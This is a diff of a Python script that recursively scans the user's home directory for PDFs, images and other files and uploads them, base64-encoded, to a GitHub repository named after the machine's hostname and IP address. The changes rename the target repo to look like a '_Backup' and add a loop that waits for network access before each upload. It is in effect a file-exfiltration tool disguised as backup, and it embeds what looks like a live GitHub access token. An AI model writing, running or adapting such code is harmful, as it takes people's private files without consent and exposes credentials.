@@ -1,14 +1,12 @@
 import os
 import socket
 import base64
-from datetime import datetime
 import requests
 import time
-import platform
 
 # ---------------- CONFIG ----------------
-GITHUB_USERNAME = "kailesh-waran-13"
-GITHUB_TOKEN = "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"
+GITHUB_USERNAME = "kailesh-waran-13"   # <-- replace with your GitHub username
+GITHUB_TOKEN = "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"         # <-- replace with your GitHub token
 BRANCH = "main"
 FILE_TYPES = {
     "PDFs": ['.pdf'],
@@ -17,9 +15,8 @@ FILE_TYPES = {
     "Images": ['.png', '.jpg', '.jpeg']
 }
 MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
-MAX_FILES_PER_PART = 1000
-RETRY_DELAY = 5  # seconds
 MAX_RETRIES = 3  # retry attempts for failures
+RETRY_DELAY = 5  # seconds
 
 # ---------------- SYSTEM INFO ----------------
 hostname = socket.gethostname()
@@ -28,11 +25,22 @@ try:
 except:
     ip_address = "UnknownIP"
 safe_ip = ip_address.replace(".", "_")
-
-# Repo name includes hostname, IP, device type
-repo_name = f"{hostname}_{safe_ip}_Windows"
+repo_name = f"{hostname}_{safe_ip}_Backup"
 
 # ---------------- HELPER FUNCTIONS ----------------
+def is_network_connected(host="8.8.8.8", port=53, timeout=3):
+    try:
+        socket.setdefaulttimeout(timeout)
+        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
+        return True
+    except Exception:
+        return False
+
+def wait_for_network():
+    while not is_network_connected():
+        print("[WAIT] Network disconnected. Retrying in 5 seconds...")
+        time.sleep(5)
+
 def create_repo_if_not_exists(token, repo_name):
     url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{repo_name}"
     resp = requests.get(url, auth=(GITHUB_USERNAME, token))
@@ -44,7 +52,7 @@ def create_repo_if_not_exists(token, repo_name):
         if resp_create.status_code == 201:
             print(f"[+] Repository '{repo_name}' created successfully!")
         else:
-            print(f"[!] Failed to create repo '{repo_name}': {resp_create.status_code} | {resp_create.json()}")
+            print(f"[!] Failed to create repo '{repo_name}': {resp_create.status_code}")
     else:
         print(f"[INFO] Using existing repository: {repo_name}")
 
@@ -63,11 +71,11 @@ def upload_file(username, token, repo, branch, folder, filepath, existing_files)
 
     if filename in existing_files:
         print(f"[SKIP] {filename} already exists")
-        return "Skipped (already present)"
+        return "Skipped"
 
     if os.path.getsize(filepath) > MAX_FILE_SIZE:
-        print(f"[SKIP] {filename} too large (>100MB)")
-        return "Skipped (too large)"
+        print(f"[SKIP] {filename} too large")
+        return "Skipped"
 
     with open(filepath, "rb") as f:
         content = base64.b64encode(f.read()).decode()
@@ -76,6 +84,7 @@ def upload_file(username, token, repo, branch, folder, filepath, existing_files)
     data = {"message": f"Add {filename}", "content": content, "branch": branch}
 
     for attempt in range(1, MAX_RETRIES + 1):
+        wait_for_network()
         resp = requests.put(url, json=data, auth=(username, token))
         if resp.status_code in [200, 201]:
             print(f"[UPLOAD] {filename}")
@@ -91,10 +100,9 @@ def scan_files():
     files_dict = {key: [] for key in FILE_TYPES}
     for root, dirs, files in os.walk(os.path.expanduser("~")):
         for file in files:
-            file_lower = file.lower()
             filepath = os.path.join(root, file)
             for folder_name, exts in FILE_TYPES.items():
-                if any(file_lower.endswith(ext) for ext in exts):
+                if any(file.lower().endswith(ext) for ext in exts):
                     files_dict[folder_name].append(filepath)
     return files_dict
 
@@ -105,22 +113,12 @@ def main():
 
     for category, file_list in files_to_upload.items():
         existing_files = get_existing_files(GITHUB_USERNAME, GITHUB_TOKEN, repo_name, category)
-        part_num = 1
-        files_uploaded_in_part = 0
-
         for fpath in file_list:
-            if files_uploaded_in_part >= MAX_FILES_PER_PART:
-                part_num += 1
-                files_uploaded_in_part = 0
+            upload_file(GITHUB_USERNAME, GITHUB_TOKEN, repo_name, BRANCH, category, fpath, existing_files)
+            existing_files.add(os.path.basename(fpath))
 
-            folder = f"{category}/Part{part_num}"
-            status = upload_file(GITHUB_USERNAME, GITHUB_TOKEN, repo_name, BRANCH, folder, fpath, existing_files)
-
-            if status == "Uploaded":
-                existing_files.add(os.path.basename(fpath))
-                files_uploaded_in_part += 1
-
-    print("[INFO] All files processed successfully.")
+    print("[INFO] All files processed.")
 
 if __name__ == "__main__":
     main()
+
